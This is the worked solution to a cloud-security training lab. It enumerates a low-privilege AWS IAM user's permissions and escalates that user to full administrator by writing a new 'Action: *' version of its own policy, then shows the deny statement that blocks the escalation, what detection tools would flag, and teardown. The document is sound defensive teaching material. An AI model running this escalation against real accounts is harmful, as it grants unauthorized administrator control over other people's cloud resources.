# Day 14 Lab — Solution

Full worked solution: enumeration, the escalation path, the deny statement that closes
it, and what each defensive tool would flag. All commands assume `setup.sh` has
already run and `day14-lowpriv` is configured as a local AWS CLI profile (see
[`README.md`](README.md)).

## 1. Enumeration (enumerate-iam-style)

A real attacker holding only these low-priv credentials cannot call
`iam:GetAccountAuthorizationDetails` (not granted, and it's rarely granted to non-admin
principals in practice). The open-source **`enumerate-iam`** tool handles exactly this
situation by brute-forcing on the order of 100+ narrow read-only/dry-run/simulate calls
and reporting which ones succeed. Here, because we already know the username, the same
map is built with six targeted calls instead of a blind sweep:

```sh
# 1. Who am I, in which account?
aws sts get-caller-identity --profile day14-lowpriv
```
```json
{
    "UserId": "AIDAEXAMPLE...",
    "Account": "<account-id>",
    "Arn": "arn:aws:iam::<account-id>:user/day14-lowpriv"
}
```

```sh
# 2. What's attached to me?
aws iam list-attached-user-policies --user-name day14-lowpriv --profile day14-lowpriv
```
```json
{
    "AttachedPolicies": [
        { "PolicyName": "day14-lowpriv-policy",
          "PolicyArn": "arn:aws:iam::<account-id>:policy/day14-lowpriv-policy" }
    ]
}
```

```sh
# 3. Any group memberships? (none expected in this lab, but always check)
aws iam list-groups-for-user --user-name day14-lowpriv --profile day14-lowpriv
```
```json
{ "Groups": [] }
```

```sh
# 4. Read the policy's metadata — which version is active?
POLICY_ARN="arn:aws:iam::<account-id>:policy/day14-lowpriv-policy"
aws iam get-policy --policy-arn "$POLICY_ARN" --profile day14-lowpriv
```
```json
{
    "Policy": {
        "PolicyName": "day14-lowpriv-policy",
        "DefaultVersionId": "v1",
        "AttachmentCount": 1
    }
}
```

```sh
# 5. Read the actual document of that active version.
aws iam get-policy-version --policy-arn "$POLICY_ARN" --version-id v1 --profile day14-lowpriv
```
```json
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                { "Sid": "EnumerationReadOnly", "Effect": "Allow",
                  "Action": ["sts:GetCallerIdentity", "iam:GetUser",
                             "iam:ListAttachedUserPolicies", "iam:ListUserPolicies",
                             "iam:ListGroupsForUser", "iam:GetPolicy",
                             "iam:GetPolicyVersion", "iam:ListPolicyVersions"],
                  "Resource": "*" },
                { "Sid": "PLANTED_MISCONFIG_SelfModifyingPolicy", "Effect": "Allow",
                  "Action": ["iam:CreatePolicyVersion", "iam:SetDefaultPolicyVersion"],
                  "Resource": "arn:aws:iam::<account-id>:policy/day14-lowpriv-policy" }
            ]
        },
        "VersionId": "v1"
    }
}
```

**This is the finding.** Statement `PLANTED_MISCONFIG_SelfModifyingPolicy` grants
`day14-lowpriv` the ability to create and activate new versions of
**`day14-lowpriv-policy` itself** — the exact policy that governs `day14-lowpriv`'s own
permissions. Nothing else in the account needs to be examined; this one statement is
the entire escalation path.

```sh
# 6. Confirm no other version already exists worth reviewing.
aws iam list-policy-versions --policy-arn "$POLICY_ARN" --profile day14-lowpriv
```
```json
{ "Versions": [ { "VersionId": "v1", "IsDefaultVersion": true } ] }
```

## 2. The escalation path

```sh
cat > /tmp/day14-admin-version.json <<'EOF'
{
  "Version": "2012-10-17",
  "Statement": [
    { "Effect": "Allow", "Action": "*", "Resource": "*" }
  ]
}
EOF

aws iam create-policy-version \
  --policy-arn "$POLICY_ARN" \
  --policy-document file:///tmp/day14-admin-version.json \
  --set-as-default \
  --profile day14-lowpriv
```

Expected response:

```json
{
    "PolicyVersion": {
        "Document": { "...": "..." },
        "VersionId": "v2",
        "IsDefaultVersion": true,
        "CreateDate": "..."
    }
}
```

`v2` is now the default (active) version of `day14-lowpriv-policy`. The **existing**
attachment of that policy to `day14-lowpriv` (created back in Step 5 of `setup.sh`,
before any attack occurred) now grants `day14-lowpriv` unrestricted `Action: *,
Resource: *` — no new `iam:AttachUserPolicy` call, no new group membership, no new
access key for a different user. The attack surface was entirely inside a policy
document `day14-lowpriv` was already permitted to edit.

**Proof the escalation is real, not just a document change:**

```sh
aws iam list-users --profile day14-lowpriv
```

Before Step 2's `create-policy-version`, this returns:

```
An error occurred (AccessDenied) when calling the ListUsers operation: User: arn:aws:iam::<account-id>:user/day14-lowpriv is not authorized to perform: iam:ListUsers
```

After it, the identical call succeeds and returns the full user list for the account —
same credentials, same access key, only the policy document behind them changed.

**Why `CreatePolicyVersion` and not `AttachUserPolicy`:** this lab specifically plants
the version-rewrite primitive (rather than a direct `AttachUserPolicy`
misconfiguration, covered instead in Drill 1 of `content/day14-iam-privesc.md`) because
it's the primitive most likely to be missed in review — a policy scoped tightly to "one
named resource ARN" reads as safe at a glance, and only becomes dangerous once you ask
which identity that one resource is attached to.

## 3. The single deny statement that breaks it

Attach this as a permissions boundary (or as an additional managed/inline policy) on
`day14-lowpriv`, from the admin profile:

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "DenyPolicyVersionSelfEscalation",
      "Effect": "Deny",
      "Action": [
        "iam:CreatePolicyVersion",
        "iam:SetDefaultPolicyVersion"
      ],
      "Resource": "*"
    }
  ]
}
```

With this attached, re-running Step 2's `create-policy-version` call — unchanged,
against the same policy ARN, with the same low-priv credentials — now fails:

```
An error occurred (AccessDenied) when calling the CreatePolicyVersion operation: User: arn:aws:iam::<account-id>:user/day14-lowpriv is explicitly denied to perform: iam:CreatePolicyVersion
```

**Why this specific statement, and why it's sufficient on its own:** IAM's policy
evaluation order is *explicit deny beats every allow, in any policy, evaluated at any
point* — there is no way to attach a second, more-permissive `Allow` anywhere in the
account that overrides an applicable explicit `Deny`. This is why the fix is a single
statement rather than "find and remove every self-referential `Allow`": as long as this
deny is attached to the principal, it doesn't matter what any current or future
attached policy's document says about `CreatePolicyVersion` or
`SetDefaultPolicyVersion` — the deny always wins for those two actions, for this
principal, full stop. `Resource: "*"` is deliberate, not just convenient: scoping the
deny only to the *current* policy ARN would recreate the same blind spot this whole lab
exploited — a narrowly-scoped statement that looks safe until a *different* resource
becomes reachable.

## 4. What Access Analyzer and pmapper would each flag

- **IAM Access Analyzer (unused-access analyzer):** would report
  `iam:CreatePolicyVersion` and `iam:SetDefaultPolicyVersion` on
  `day14-lowpriv-policy` as **unused permissions** — granted, but never exercised in
  the CloudTrail-observed history, prior to this lab's Attack section actually calling
  them. This finding exists independent of any privesc reasoning; it's purely
  usage-based, which is exactly why it's a good tripwire for exactly this kind of
  standing, forgotten grant. Access Analyzer's **external-access** analyzer reports
  nothing here — no resource policy in this lab grants access across accounts or
  publicly, so that half of the tool has nothing relevant to say about this
  misconfiguration.
- **pmapper:** `pmapper graph create --profile cyberlab-sandbox` followed by
  `pmapper analysis --profile cyberlab-sandbox` would report a privilege-escalation
  edge naming `day14-lowpriv` as able to reach effectively-administrator access via
  `CreatePolicyVersion` on `day14-lowpriv-policy` — computed directly from the account's
  IAM graph, not from usage history, so it would flag this **immediately after
  `setup.sh` runs**, before any enumeration or exploitation ever happens. This is the
  meaningful difference from Access Analyzer's unused-access finding above: pmapper
  reasons about *reachability*, not *usage*, so it doesn't need to wait for the
  vulnerable action to ever actually be called.

## 5. Teardown verification

After `./teardown.sh`:

```sh
aws iam get-user --user-name day14-lowpriv --profile cyberlab-sandbox
```

Expected:

```
An error occurred (NoSuchEntity) when calling the GetUser operation: The user with name day14-lowpriv cannot be found.
```

Also confirm the policy is gone:

```sh
aws iam get-policy --policy-arn arn:aws:iam::<account-id>:policy/day14-lowpriv-policy --profile cyberlab-sandbox
```

Expected: the same `NoSuchEntity` error, for the policy.
